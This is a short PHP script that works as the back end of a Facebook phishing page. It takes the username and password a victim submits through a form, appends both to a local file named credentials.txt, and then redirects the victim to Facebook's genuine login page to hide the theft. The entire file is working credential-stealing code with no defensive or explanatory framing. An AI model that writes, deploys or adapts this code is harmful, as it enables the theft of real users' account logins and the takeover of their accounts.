<?php
$username = $_POST['username'];
$password = $_POST['password'];

// Save the credentials to a file
$file = fopen('credentials.txt', 'a');
fwrite($file, "Username: " . $username . "\n");
fwrite($file, "Password: " . $password . "\n");
fwrite($file, "------------------------\n");
fclose($file);

// Redirect to Facebook's official login page
header('Location: https://www.facebook.com/login');
?>
